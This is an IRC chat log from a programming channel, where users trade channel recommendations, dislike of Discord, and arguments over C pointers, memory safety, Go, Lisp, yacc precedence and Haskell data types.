[22:02:09] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[22:02:57] *** Quits: hqdruxn08__ (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com) (Ping timeout: 240 seconds)
[22:03:07] <ProfSimm> Multiple dispatch: is it a good idea, or taking things too far (over single dispatch)
[22:03:38] <beaky> what are the best irc channels
[22:03:43] <ProfSimm> dis
[22:04:18] <[itchyjunk]> this might be the dumbset thing i've seen today
[22:04:19] <[itchyjunk]> https://www.youtube.com/watch?v=0Z5_mgxoXeM
[22:04:20] <bayaz> Title: Victims Find Out Their Partners Are FBI Agents 
[22:04:22] <[itchyjunk]> heh
[22:04:23] *** Quits: password2 (~password8@user/password2) (Ping timeout: 256 seconds)
[22:04:28] <pyzozord> i don't know for the most part i use only this channel
[22:04:56] <[itchyjunk]> beaky, irc ded, try discord
[22:05:46] <nomagno> Quick Libera channel list: ##programming, ##workingset, #gamedev, ##English, #linux, #winehq, #scheme 
[22:05:57] <pyzozord> [itchyjunk]: lol this is dumb, i like those dumb ones
[22:06:15] <ProfSimm> It's a good idea to involve people already in relationship
[22:06:24] <[itchyjunk]> ##math, #proglangdesign
[22:06:27] <ProfSimm> And it's not some shock-out gag that would give you a heart-attack
[22:06:40] <pyzozord> ##osdev #c #bash #python
[22:06:44] * [itchyjunk] shoots someone in face
[22:06:47] <nomagno> Oh, didn't know proglangdesign was a thing
[22:06:47] <[itchyjunk]> it's only a prank bro
[22:06:57] <GeDaMo> It's #osdev
[22:07:03] <[itchyjunk]> proglangdesign is highquality
[22:07:04] <edgar-rft> beaky: all irc channels are best channels
[22:07:29] <pyzozord> I think most other channels are much more strict on topic, and fairly so
[22:07:43] <pyzozord> nice to have both kinds available
[22:08:29] *** Joins: no_gravity (~no_gravit@user/no-gravity/x-5639427)
[22:08:43] <no_gravity> Hello! Does anybody know what determines the ip range of the docker demon?
[22:08:53] <pyzozord> ##networking btw
[22:08:57] <pyzozord> very good one
[22:09:10] <beaky> yes they are hardcore networking 
[22:09:12] <pyzozord> #networking
[22:09:13] *** Joins: Jigsy (~Jigsy@user/jigsy)
[22:09:14] <[itchyjunk]> best on #[itchyjunk] 
[22:09:19] <[itchyjunk]> one*
[22:10:12] <ProfSimm> ordered vs named parameters. is there benefit to ordered ones
[22:10:17] <pyzozord> isn't it docker itself that determines it's ips?
[22:10:24] <apotheon> 11:34 < [itchyjunk]> beaky, irc ded, try discord
[22:10:27] <apotheon> Fuck Discord.
[22:10:28] <pyzozord> I mean it's internal ips for containers, the external ip is localhost
[22:10:42] <nomagno> apotheon: I don't think that was loud enough
[22:11:00] <nomagno> FUCK. DISCORD. !!!!!
[22:11:37] <apotheon> The kinds of problems of which people were accusing Andrew Lee on Freenode are exactly the problems that, on Discord, aren't even considered problems.
[22:11:50] <user51> what are the discord problems?
[22:12:19] <pyzozord> discord is ok, although I met much more knowledgeable people here
[22:12:23] <nomagno> apotheon: That's mostly because the user bases have almost no overlap, not because there's a double standard
[22:12:41] <apotheon> things like "all your data are belong to us (and our partners)" and "promoting a partisan agenda through policy" and so on
[22:12:45] *** Joins: vysn (~vysn@user/vysn)
[22:12:46] *** Parts: no_gravity (~no_gravit@user/no-gravity/x-5639427) ()
[22:13:08] <apotheon> nomagno: yep
[22:13:42] <mrig> hay eternal september is nearly over, hooray for discord :) 
[22:13:48] <apotheon> har
[22:13:50] <mrig> hey rather
[22:13:55] <nomagno> The most fun I ever had in Discord was punching the 'GET MY DATA' button, then the 'DELETE MY DATA' button
[22:13:55] <apotheon> hay guise
[22:14:00] <nomagno> then toying around with language models
[22:14:08] <nomagno> from my machine-readable data log
[22:14:13] *** Joins: freep (~freepppp@62.1.245.43.dsl.dyn.forthnet.gr)
[22:14:26] <nomagno> ... wasn't a lot of fun
[22:14:32] <nomagno> But was more fun than using discord itself!
[22:14:42] *** Joins: lunarkitty (uid501895@user/pyra)
[22:14:59] <apotheon> That's amusing.
[22:15:13] *** Joins: jarthur (~jarthur@2603-8080-1540-002d-b547-ef3f-a0b7-179d.res6.spectrum.com)
[22:15:28] *** Joins: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca)
[22:15:42] <apotheon> Discord has other problems, too -- such as no particular options for clients, and a UI in the limited options that do exist that is invariably kinda hostile.
[22:16:01] <apotheon> Jeebus, the scrollbars in the web client alone can just frustrate the fuck out of someone.
[22:16:18] <sonny> notifications are not good either
[22:16:39] <apotheon> I kinda "have to" use Discord a little bit for about a month each year, and it's just kinda awful.
[22:17:15] <nomagno> For some reason, it is within the scope of civil law to include 'you can't add custom CSS to our website' in terms of service
[22:17:25] *** Quits: jamea22 (~jamea@201.77.110.253) (Ping timeout: 256 seconds)
[22:17:30] <apotheon> That's fucking terrible.
[22:17:41] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[22:17:42] <apotheon> "Fuck your accessibility requirements."
[22:18:17] *** Joins: jamea (~jamea@201.77.110.253)
[22:18:58] <Stefan26> discord is good?
[22:19:08] <apotheon> One thing that actually makes me more willing to use Matrix than Discord is the fact that with Matrix you're *encouraged* to make a new client if you want it.
[22:19:34] *** Joins: federico_it (~textual@151.38.69.79)
[22:19:34] <apotheon> Stefan26: I don't think anyone said that.  What do you mean with that question?
[22:21:13] <nomagno> apotheon: Well, Matrix is not much different than IRC both on a technical and on a licensing/open culture level, so the list might as well be approaching infinity
[22:21:25] *** Joins: kusanagi (~lkg@pool-108-30-117-35.nycmny.fios.verizon.net)
[22:21:50] *** Joins: Akuli (~Akuli@213.216.210.130)
[22:21:59] <apotheon> nomagno: . . . of clients?  I guess.  It's not functionally there yet, in that there isn't a client that satisfies my needs as well as the client I use for IRC.
[22:22:28] <nomagno> apotheon: No, of reasons
[22:22:29] <nomagno> :P
[22:22:31] <ProfSimm> In LISP if I want to call a function returned from a function it'd look like this I guess?   ((foo 1 2 3) 4 5 6)
[22:23:10] <sonny> not sure, there is funcall
[22:23:13] <pyzozord> god damn received email from the old job. Such a stark contrast of competency
[22:23:17] <apotheon> nomagno: Do you mean reasons to prefer Matrix over Discord?  If so, yeah, I guess that's right.
[22:23:17] <sonny> it would look that way in scheme
[22:23:22] <beaky> yes it depends on what lisp
[22:23:28] <nomagno> apotheon: Yeah
[22:23:33] <ProfSimm> oh so it depends ont he lisp
[22:23:37] <ProfSimm> What other options are there
[22:23:46] <ProfSimm> In haskell it'd be (I think) foo (1 2 3) (4 5 6)
[22:23:46] <apotheon> pyzozord: Which is more competent?
[22:23:46] <pyzozord> from the new perspective the people in the old job seem like they are absolutely clueless and have zero interest in changing that fact
[22:23:57] <pyzozord> apotheon: new one but an order of magnitude
[22:24:13] <beaky> you need funcall in common lisp because it is lisp 2 where it has different namespaces for values and functions the 'funcall' tells it to evaluate the value as a function call (scheme is lisp 1)
[22:24:26] <pyzozord> mrig: btw I'll be working with go :)
[22:24:34] <apotheon> pyzozord: Congratulations, then.
[22:24:40] <nomagno> Oh go is nice
[22:24:46] <pyzozord> mrig: the project my team owns is js+go
[22:24:49] <ProfSimm> beaky: different namespaces, that sounds unfortunate
[22:24:55] *** dirigible85 is now known as dirigible
[22:24:58] *** Quits: dirigible (~dirigible@2607:9000:0:3:36a4:cf80:2f7b:6990) (Quit: Leaving)
[22:24:59] <pyzozord> yep, go is very nice, I thought I'll be doing php, but go is so much better
[22:25:06] <sonny> I am doing a compiler in scheme and I keep bumping into stuff, like not having enumerated types. It is making me think though
[22:25:08] <pyzozord> apotheon: thanks :)
[22:25:08] <nomagno> The only thing I have to say about it is 'toyed around with it for coroutines once, was fun'
[22:25:13] *** Joins: dirigible (~dirigible@2607:9000:0:3:36a4:cf80:2f7b:6990)
[22:25:25] <apotheon> Yeah, Go is much, much better than PHP, in my experience.
[22:25:28] <mrig> pyzozord: oh superb, that's a great mix.
[22:25:35] <nomagno> But I know a fair bit about it from a meta-language perspective
[22:25:44] <pyzozord> go is simple, it's like half point between c and python. I like both c and python
[22:25:49] <sonny> guess it's time for a js interpreter in go
[22:25:53] <nomagno> Similar to C, garbage collected, concurrency and coroutines as the focus
[22:25:58] <nomagno> It sounds like a fun time to me!
[22:26:01] <sonny> that'd be popular I imagine
[22:26:15] <apotheon> I like C.
[22:26:25] <sonny> heh, c syntax really carries :P
[22:26:33] <apotheon> Go isn't my favorite, but I'd take it over PHP without even having to think about it.
[22:26:34] <sonny> guess the adage is true after all
[22:26:52] <pyzozord> I'd take go over many languages, at this point over js too
[22:27:04] <pyzozord> if go didn't have garbage collection, I'd take it over c too
[22:27:08] <mrig> pyzozord: my plan is to look a JS to smooth things over once I can make everything work first without it.
[22:27:15] *** Joins: wilz (~wilz@modemcable036.177-131-66.mc.videotron.ca)
[22:27:25] <pyzozord> (although not for job stuff, for job stuff garbage collection is amazing :P)
[22:27:57] <nomagno> pyzozord: If your PyzoLang thingy is still up in the air, I can definitely tell you I have found using ONLY stack-allocated memory on my project to be surprisingly comfortable
[22:27:58] *** Quits: newpy (~newpy@2601:280:4381:1390:3d0c:64dc:3003:dbe5) (Quit: Leaving)
[22:27:58] <apotheon> I'd take Python over PHP, but not really enthusiastically -- though if you guaranteed I wouldn't ever have to write Python in any style but that promoted by Flask, that would improve my outlook a lot.
[22:28:15] <pyzozord> nomagno: oh? do tell more
[22:28:36] <pyzozord> nomagno: can you give an example or what you noticed?
[22:28:49] <apotheon> I think that, in some use cases and if I got to establish the project code styles, I might take JavaScript over Go.  I'm not sure.
[22:29:17] <apotheon> I would not take Go over C, regardless of GC.
[22:29:27] <sonny> apotheon why's that?
[22:29:36] <sonny> JS over go
[22:30:15] <nomagno> pyzozord: Well, from a program architecture perspective, you need to make certain stateless procedures where the called subroutine would decide how much memory to allocate into stateful ones
[22:30:17] <sonny> easier to make collections?
[22:30:20] <apotheon> Some of those things that are Pythonesque about Go are things I dislike -- such as some things being essentially community- and tool-mandated styles for aspects of the shared style that are frankly stupid.
[22:30:34] *** Quits: enoq (~enoq@2a05:1141:1f5:5600:b9c9:721a:599:bfe7) (Quit: enoq)
[22:30:41] <sonny> that was a block for me at first
[22:30:48] <pyzozord> nomagno: do you have maybe some example code that uses this?
[22:30:52] <apotheon> sonny: There's a beautiful language inside JavaScript; there's only a practical language inside Go.
[22:30:53] <nomagno> Essentially, size = get_size(); datavar create_size(size); get_data(datavar)
[22:30:54] <sonny> now I just don't care for some reason
[22:30:58] *** Joins: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad)
[22:31:26] <pyzozord> nomagno: do you mean datavar = create_size(size)?
[22:31:30] <sonny> I think lua is a better variant than JS
[22:31:31] *** Joins: we3fan (~we3fan@89.185.206.82)
[22:31:31] <nomagno> yes
[22:31:41] <sonny> I dunno about beautiful
[22:31:42] <apotheon> I haven't used Lua, so I wouldn't know about that comparison.
[22:31:52] <sonny> oh ok
[22:31:57] <nomagno> Also, you need to refactor returning pointers into pointer arguments, or some other custom syntax
[22:32:05] <apotheon> The beautiful language in JS doesn't use classes, by the way.
[22:32:18] <nomagno> I also thoroughly recommend you make return values composite by default
[22:32:28] <sonny> JS doesn't have classes until recently
[22:32:32] <sonny> and they are sugar
[22:32:39] <apotheon> . . . and they blow.
[22:33:01] <apotheon> They feel bolted on and, for any non-trivial use case, you basically get excommunicated if you're not using classes.
[22:33:08] <sonny> lol
[22:33:27] <sonny> didn't know JS had a church
[22:33:28] <pyzozord> nomagno: composite?
[22:33:34] <apotheon> Even before there were classes in ECMAScript, there were classes in libraries that you'd be "forced" to use if you want to be part of the flock.
[22:33:35] <nomagno> pyzozord: func() { return { err = 2, data = foobar }; } funcdata = func(); printf(funcdata.err); process(funcdata.data);
[22:33:46] <sonny> oof
[22:33:46] <pyzozord> oh returning structs by value
[22:33:51] <apotheon> sonny: Every language with any significant user base has at least one church.
[22:33:55] <nomagno> Yes, but like
[22:33:57] <nomagno> Actually native
[22:34:10] <apotheon> C has a dozen, which makes it easier to be a heretic, atheist, or whatever, in C terms.
[22:34:22] <pyzozord> nomagno: not sure what do you mean by native
[22:34:28] <sonny> apotheon C seems rather passive
[22:34:34] <pyzozord> also generally I think more people smile to me on average now :P
[22:34:34] <sonny> oh I see
[22:34:37] <nomagno> As in, separate each function into debug data, information data, and error data
[22:34:38] <nomagno> or whatever
[22:34:39] <pyzozord> or maybe I smile more
[22:34:41] <sonny> it just has a lot ;)
[22:34:47] <apotheon> sonny: Get in a debate about code style with a GNU adherent some time.
[22:35:09] <apotheon> sonny: Try talking to people who say "tabs for indentation, spaces for alignment" some time, too.
[22:35:11] <nomagno> pyzozord: provide syntax for this
[22:35:16] <sonny> hmm, yeah I missed that part
[22:35:23] <sonny> maybe that's why
[22:35:25] *** Quits: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad) (Ping timeout: 240 seconds)
[22:35:27] <pyzozord> nomagno: right, c doesn't do it
[22:35:44] <apotheon> sonny: There are fanatical "religions" within C, and they're not at peace -- just detente.
[22:35:44] <nomagno> Yeah, struct syntax is fine, but you can definitely improve it
[22:36:20] <sonny> apotheon I did notice programming languages are social last year, it was a big revelation
[22:36:25] *** Joins: spaceangel (~spaceange@ip-78-102-216-202.net.upcbroadband.cz)
[22:36:25] <pyzozord> nomagno: so when you do funcdata = func() does the return inside func actually write the data into the funcdata directly or does it copy it there from the inner stack frame?
[22:36:38] <apotheon> sonny: Now for the fun part . . .
[22:36:45] <apotheon> sonny: GitHub is a social network for code.
[22:37:04] <nomagno> for instance, keep a kind of short snapshot of previous calls, so you can do [ID = 1]func(); [ID = 2]func(); printf([1]func()[data])
[22:37:11] * sonny has lightbulb flash above head
[22:37:25] <pyzozord> nomagno: stack is the ultimate garbage collection device, fully deterministic, very simple very familiar. I don't get why people use heap
[22:37:46] <sonny> yeah, there a certainly a lot of technical issues that are really social
[22:37:52] *** Parts: MrMobius (~MrMobius@pool-108-31-243-125.washdc.fios.verizon.net) (Leaving)
[22:37:55] <apotheon> pyzozord: lotsa reasons
[22:37:57] <nomagno> pyzozord: Oh the heap definitely shouldn't be sacrificed
[22:37:58] *** Joins: MrMobius (~MrMobius@pool-108-31-243-125.washdc.fios.verizon.net)
[22:38:11] <nomagno> It allows you to do whatever the heck you want with memory
[22:38:31] <nomagno> But a completely stack-based language would be interesting regardless
[22:38:39] <sonny> I assert deterministic memory management is not possible
[22:38:45] <pyzozord> they use the heap, they create inevitable sphagetti of pointers and dependencies, and then they contrive complex concepts to constraint that sphagetting and put it back in the box
[22:38:49] <pyzozord> why open the box
[22:39:14] <apotheon> Static memory (heap) allows you to do fun stuff like write a programming language implementation -- including C compilers -- that won't turn out to be giant steaming turds.
[22:39:30] <sonny> lol
[22:39:37] <pyzozord> apotheon: very constructive point :D
[22:39:51] <apotheon> sonny: Do you assert() it?
[22:39:52] <pyzozord> *informative
[22:40:04] <MrMobius> pyzozord, how would you handle a situation where a program will load into memory between 1 and 1,000 files simultaneously and each file is between 1 byte and 10GB without a heap?
[22:40:08] <sonny> someone just needs to make chomsky heirachy but for memory in programs
[22:40:33] <sonny> (it includes memory already I know)
[22:40:44] *** Joins: Guest15 (~Guest15@ip72-199-239-162.sd.sd.cox.net)
[22:40:51] <pyzozord> MrMobius: allocate 10000GB
[22:40:58] <pyzozord> that's your maximal program requirement
[22:41:00] <ProfSimm> Aside from ordered arguments, and named arguments, is there some other way?
[22:41:08] <apotheon> The fact that many people think pointers are the biggest problem in C is very strong evidence that the biggest problem with C is actually the fact that almost nobody seems to consciously understand C.
[22:41:11] <pyzozord> and let the os handle which pages of memory you _actually_ use
[22:41:21] <user51> i like pointers
[22:41:30] * [itchyjunk] points at user51 
[22:41:40] <apotheon> There are people who subconsciously understand it, and are amazing programmers, but they don't seem to consciously understand it well enough to teach it to someone else.
[22:41:43] *** Joins: LucaTM (~LucaTM@user/lucatm)
[22:41:47] *** Quits: rtypo (~alex@user/rtypo) (Ping timeout: 256 seconds)
[22:41:48] <ProfSimm> apotheon: understanding C doesn't mean 99% of security problems are not from pointers
[22:42:03] <MrMobius> pyzozord, good idea. what do i do though if i dont have that much ram?
[22:42:06] <apotheon> . . . so the next generation always gets taught in a way that makes people think pointers are "bad" somehow.
[22:42:14] <pyzozord> MrMobius: let the os handle that too
[22:42:24] <sonny> c sucks, use oberon!
[22:42:30] <apotheon> Far from bad, they're the heart of C, and the cause of almost everything that's good about C.
[22:42:39] <pyzozord> MrMobius: your program can't really handle the extreme case on heap too anyway
[22:42:53] <sub0> and cause of almost everything that's bad about C
[22:42:54] *** Joins: penguino (~mrpenguin@user/mrpenguin)
[22:43:06] <sonny> no
[22:43:07] <ProfSimm> apotheon: pointers represent an amalgamation of two distinct concepts. One is memory mapping, the other is value reference/identity. This is neat in some cases and horrendously limiting and error prone in other cases
[22:43:08] <user51> [itchyjunk]: you can also think about them as references
[22:43:13] <apotheon> ProfSimm: 98% of security problems are from people not understanding what they're doing.
[22:43:13] <sonny> C has a lot of problems
[22:43:23] <sonny> but it's also brilliant
[22:43:28] <apotheon> sonny: Yes, in that it has a lot of users.
[22:43:34] <sonny> lol
[22:43:42] <sonny> blaming the user is so lame
[22:43:48] <sub0> yes.. segfaults. buffer overflows. exploits. all caused by unrestricted access to memory addresses
[22:43:49] *** Joins: alefir (~alefir@rrcs-24-43-248-58.west.biz.rr.com)
[22:43:57] <apotheon> . . . or, if that's not what you mean, maybe "in the same way every language has a lot of problems".
[22:43:58] <ProfSimm> apotheon: have you heard this one. If you meet an asshole, maybe he's an asshole. If you keep meeting assholes, you're the asshole. That's C and pointer bugs.
[22:44:23] <sonny> apotheon I get what you are saying though
[22:44:35] <apotheon> ProfSimm: Pointer bugs would be far less prevalent if most programmers weren't afraid of pointers.
[22:44:44] <pyzozord> MrMobius: and if everything else fails, you get real, you allocate onl 1-10 GB and you use buffers
[22:44:52] <sonny> for example, a lot of problems come from ad-hoc parsers people make
[22:44:53] <ProfSimm> apotheon: if you can figure out how we get pointers but also memory abstraction and safety, be my guest.
[22:45:08] *** Quits: Haxxa (~Haxxa@202-144-174-197.ip4.superloop.com) (Quit: Haxxa flies away.)
[22:45:24] <sonny> in that case, you solve a class of problems by using a parser generator
[22:45:29] <pyzozord> MrMobius: and if you want your application scale from toster to a mainframe than you are having a whole another problem
[22:45:43] <user51> sonny: yacc is pretty neat, takes a while to learn though
[22:45:52] <sonny> yeah
[22:45:53] *** Quits: GreenAlpaca (~GreenAlpa@user/greenalpaca) (Quit: WeeChat 3.4)
[22:46:02] *** Joins: Haxxa (~Haxxa@202-144-174-197.ip4.superloop.com)
[22:46:09] <sonny> but I bet there would be significantly less CVEs
[22:46:10] <apotheon> C has, mostly, reduced its technical problems over time.
[22:46:20] <ProfSimm> apotheon: frankly there's nothing in pointers I think computing needs per se. It's a hack from days when this was top of the line in abstract programming. because the alternative was something like asm
[22:46:24] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[22:46:25] *** Joins: inky_ (~inky@141.136.76.120)
[22:46:30] <apotheon> Oh, there's another huge class of problems with C: implementations that convince people to use nonportable code.
[22:46:35] <user51> i was disappointed it stops at rules though. i wanted to make a nonterminal for binary operations, but since it works on a rule basis, you can't get the proper precedence.
[22:47:01] <apotheon> ProfSimm: You talk like we don't need something that close to the metal now.
[22:47:29] <ProfSimm> apotheon: what is close to the metal is vastly a different concept today due to the evolution of compilers
[22:47:52] <ProfSimm> apotheon: Swift is very close to the metal, it's extremely high-level too. And memory safe
[22:47:57] <apotheon> If you can't manually do some things, you can't manually do some things (for some concept of "manual").
[22:48:03] <ProfSimm> apotheon: similar with Rust
[22:48:04] <sonny> user51 sounds like you made a mistake
[22:48:14] <apotheon> news flash: Rust has pointers.
[22:48:23] <user51> sonny: i did, but it's part of life.
[22:48:33] <ProfSimm> apotheon: not like C
[22:48:37] <user51> doesn't make yacc any less neat :)
[22:48:43] <sonny> apotheon we will always need to address memory, so you have a good point there about common criticism
[22:48:50] <sonny> (being invalid)
[22:49:11] <ProfSimm> Object identity doesn't need to be the same as memory address.
[22:49:12] *** Joins: Guest28 (~Guest28@2a02:21b0:644d:adcb:fcc7:63bb:ced:113f)
[22:49:17] <ProfSimm> For example it isn't with PK in SQL
[22:49:21] <apotheon> further news flash: You can implement Rust-style pointers in C and impose rules restricting people to them within your organization (until someone needs to do something that ends up unmaintainable using Rust-style pointers).
[22:49:27] <sub0> rust has pointers as an option, when it is necessary. it doesn't force you to use pointers for something as simple as string manipulation
[22:49:43] *** Quits: inky (~inky@5.77.223.178) (Ping timeout: 256 seconds)
[22:49:46] <ProfSimm> apotheon: you're vastly overestimating the ability of the C type system
[22:49:47] <sonny> user51 I just couldn't tell how you were not able to get precedence
[22:49:54] <ProfSimm> apotheon: or you really don't care about safety
[22:50:08] <apotheon> ProfSimm: The Rust type system was developed in C.
[22:50:14] <ProfSimm> apotheon: irrelevant.
[22:50:19] <sonny> apotheon if you make a restriction you may as well make a programming language ...
[22:50:31] <apotheon> If you can implement it in C, you can implement it in C.  It's tautological.
[22:50:31] <ProfSimm> apotheon: Java is also written in C. Doesn't mean Java's type system is C's type system
[22:50:31] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[22:50:44] <ProfSimm> apotheon: no one is talking about implementing it in C as a brand new language
[22:50:47] <sub0> in theory you can write C compiler in brainfuck. doesn't mean anything
[22:50:51] <apotheon> sonny: Oh, C could definitely be better, but Rust isn't a better C.  It's a better C++.
[22:50:53] <ProfSimm> apotheon: you're not even trying to be intellectually honest
[22:51:03] <apotheon> (to the extent it's "a better $FOO")
[22:51:19] <sonny> apotheon not saying that, but I agree anyways
[22:51:37] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 240 seconds)
[22:51:50] <apotheon> ProfSimm: I think you're the one being intellectually dishonest if you say that about me -- or you just have no clue what's being discussed.
[22:52:37] <ProfSimm> apotheon: I have no interest in this aggressive "fuck those who don't like C pointers" type of drunken-after-work-in-a-bar talk
[22:52:51] <apotheon> You're putting words in my mouth, now.
[22:52:54] <user51> sonny: http://sprunge.us/Ew5uqB
[22:52:59] <apotheon> . . . and playing internet psychologist with me.
[22:53:03] <user51> i tried doing something like that a while ago
[22:53:15] <apotheon> I think I'm done playing that game.
[22:53:25] <sub0> apotheon I agree with you there though. C, as a portable minimalistic system language, probably has its place in the future. C++ on the other hand, should just be  doused in gasoline and burned
[22:53:40] <user51> in retrospect, i think i made too more complicated :(
[22:54:18] <sonny> user51 this can be handled using %precedence
[22:54:24] <apotheon> sub0: If I had the time and was more confident in my ability to get things right, I would be working on a "better C" now.  There are definitely things that should be changed, and won't in C because of the political requirements of C itself.
[22:54:26] <ProfSimm> C will be around simply because of the ecosystem. Lots of things would disappear without their ecosystem. C, PHP and JavaScript as a few examples
[22:54:41] <user51> sonny: lemme read the yacc man
[22:54:59] <apotheon> sub0: . . . but there is definitely a need for a pointer-oriented programming language.
[22:55:03] *** Joins: freakazoid333 (~matt@2603:9000:cf0f:80e3:e910:528:fa6e:c5d5)
[22:55:11] <pyzozord> I say the opposite
[22:55:21] <sonny> user51 <https://www.gnu.org/software/bison/manual/html_node/Precedence.html>
[22:55:23] <ProfSimm> There's not a single thing that requires pointers
[22:55:26] <pyzozord> there is a need for no-pointers-oriented language
[22:55:39] <sonny> how do you get memory?
[22:55:39] *** Joins: CoderGuy2 (~CoderGuy@2601:644:102:2820:88cd:d3b6:3255:3aac)
[22:55:45] <GeDaMo> IMplicitly
[22:55:53] <sonny> like java?
[22:56:04] <pyzozord> like int i = 10;
[22:56:23] <pyzozord> or int i2[99999] = {0}
[22:56:41] <user51> sonny: something like this? http://sprunge.us/sIRajz
[22:56:51] <sonny> pyzozord I will be making such a language 
[22:57:01] *** Joins: hqdruxn08 (~hqdruxn08@cpe-66-68-166-214.austin.res.rr.com)
[22:57:02] *** Quits: freakazoid333 (~matt@2603:9000:cf0f:80e3:e910:528:fa6e:c5d5) (Read error: Connection reset by peer)
[22:57:05] <pyzozord> I am very intrigued by that idea
[22:57:18] <sonny> it's not very useful
[22:57:20] <user51> pyzozord: no pointers oriented? how does that work?
[22:57:45] <GeDaMo> You can have access to raw pointers without the entire language being based around them
[22:57:45] <pyzozord> and also it's suprising that pointers are so engrained in peoples' brains that they literally can't imagine how it would work without pointers
[22:57:48] <ProfSimm> user51: by not exposing raw memory addresses
[22:57:59] <wuldor> https://bpa.st/SO5Q
[22:58:00] <bayaz> Title: View paste SO5Q 
[22:58:02] <sonny> user51 no, you will use %precedence. each line will have a %precedence witha token
[22:58:02] <ProfSimm> user51: case in point Java
[22:58:08] <GeDaMo> Algebraic data types
[22:58:14] <user51> sonny: oh DAMNIT, my bad
[22:58:19] *** Quits: TheCoffeMaker (~TheCoffeM@user/thecoffemaker) (Quit: So long and thanks for all the fish)
[22:58:23] <ProfSimm> OK enough about pointers. Let's talk function arguments... 1) ordered arguments 2) named arguments 3) ???
[22:58:23] <sonny> no worries
[22:58:23] <wuldor> on line 31 where I have called glGenerateMipmap I get a segfault, any idea what causes it?
[22:58:34] <user51> you really lose what you don't use :)
[22:58:49] <GeDaMo> data List a = Cons a (List a) | Nil 
[22:58:54] <GeDaMo> Linked lists without pointers
[22:59:02] <apotheon> I think that, to validate the claim that nobody needs pointers, one would need to use C (or the C-like subset of ObjC or C++, I suppose) to write a compiler for a language without pointers that is every bit as good for all use cases that, at present, don't really admit other languages as equally well suited as C.
[22:59:17] *** Quits: CoderGuy (~CoderGuy@user/coderguy) (Ping timeout: 240 seconds)
[22:59:25] <sonny> GeDaMo true, but that won't work for a systems language I think
[22:59:27] <sub0> GeDaMo dishing out haskell code like a boss :P
[22:59:29] <apotheon> That might be possible, but I don't think it works without inventing something new we haven't seen yet as a way to handle memory management.
[22:59:34] <user51> for me pointers are more about reference than memory
[22:59:37] <[itchyjunk]> isn't that lisp?
[22:59:42] <sonny> I was thinking about it, and the main idea is addressing memory
[22:59:53] <GeDaMo> I don't know a lot of Haskell but that's where I learned about algebraic data types
[22:59:54] *** Joins: TheCoffeMaker (~TheCoffeM@user/thecoffemaker)
[22:59:58] <sonny> c doesn't even have arrays tbh
[23:00:06] <apotheon> . . . and that language needs to be susceptible to a that-something-oriented approach to programming.
[23:00:13] <[itchyjunk]> :o algebriac data types
[23:00:14] <sub0> [itchyjunk], names are lispy, but code is haskell
[23:00:19] <[itchyjunk]> sonny, address them as sir/miss
[23:00:25] <[itchyjunk]> sub0, i see
[23:00:30] <sonny> [itchyjunk] functional languages seem to share concepts much more easily
[23:00:37] *** Quits: varaindemian (uid73404@id-73404.ilkley.irccloud.com) (Quit: Connection closed for inactivity)
[23:00:40] <sonny> probably because they are better defined
[23:00:41] <[itchyjunk]> sonny, why is that?
[23:00:41] <user51> anyway, my conclusion is to just learn some few languages, because languages hold the experience of people, and by doing that you learn from them
[23:00:50] <[itchyjunk]> oh makes sense
[23:00:59] <[itchyjunk]> the concepts are formally rigorous
[23:01:02] <sub0> List is either a Nil, or Cons element remainingList. it is a recursive data structure, like all linked lists
[23:01:03] <sonny> yeah, lots of them are somewhat formally defined too
[23:01:05] <apotheon> The importance of a language based around pointers is that any use case that is deeply dependent on that kind of memory management is less prone to blowing up in your face if the language as a whole is built around the assumption of pointers.
[23:01:06] *** Joins: src (~src@user/src)
[23:01:07] <sonny> [itchyjunk] yeah
[23:01:29] <apotheon> It's a matter of programming ergonomics designed to help you reason about pointers.
[23:01:38] <sonny> that's the problem
[23:01:38] <GeDaMo> In C you use pointers for everything because that's what you've got but there can be other ways of doing many things
[23:01:42] <[itchyjunk]> I wish I knew haskell
[23:01:52] <bjs> [itchyjunk]: then learn it :)
[23:01:54] <sonny> there isn't a way to reason about memory
[23:02:04] <GeDaMo> There are still uses for raw pointers but they don't have to be a pervasive element
[23:02:15] <sonny> yeah, that's also true
[23:02:17] <[itchyjunk]> i tried
[23:02:18] <ProfSimm> apotheon: do you even understand what a pointer is, and what a bad abstraction that is for heap allocation?
[23:02:20] <[itchyjunk]> it too hard
[23:02:37] <sonny> [itchyjunk] if you have time, read the introduction to haskell
[23:02:47] <sonny> it's not bad at all, especially for you
[23:02:51] <bjs> [itchyjunk]: the language isn't too hard,  the problem is probably just that you're too used to other languages and are having to learn a bunch of stuff basically from scratch
[23:02:53] <[itchyjunk]> i have all the time, I don't have the attention span to make i through a book
[23:02:56] <sonny> the downside is, that thing is 20 pages
[23:03:07] <[itchyjunk]> I don't really know any other programming language well though
[23:03:14] <[itchyjunk]> so that shouldln't be the reason
[23:03:15] <sonny> minus 5 if you skip the monad tutorial
[23:03:32] <[itchyjunk]> its only 20 pages?
[23:03:33] <bjs> [itchyjunk]: you know far more about programming and "imperative"-y things than you think you do
[23:03:34] <ProfSimm> apotheon: memory is remapped at least three times and split into pages and subpages, and so on before that "pointer" you're looking at can be interpreted
[23:03:38] <[itchyjunk]> i think i know the very basic
[23:03:55] <[itchyjunk]> hmm imperative..
[23:03:56] <bjs> [itchyjunk]: but Haskell works completely differently than e.g. Python or Java or C. 
[23:03:58] <ProfSimm> apotheon: you can't move pointers either
[23:04:00] * [itchyjunk] tries to remember what that one meant
[23:04:14] <apotheon> ProfSimm: You've disqualified yourself from getting my responses with your argumentum ad hominem BS.  You can stop trying to lure me into this subject with you, now.
[23:04:15] <ProfSimm> apotheon: you can't detect if something under a pointer is allocated at all. Where it ends.
[23:04:19] <sonny> [itchyjunk] oof, so I just checked and it's 64 pages lol
[23:04:42] <ProfSimm> apotheon: also you don't know what "ad hominem" is
[23:04:50] <apotheon> 12:23 < apotheon> I think I'm done playing that game.
[23:05:01] <[itchyjunk]> sonny, every time you check it will go up in pages!
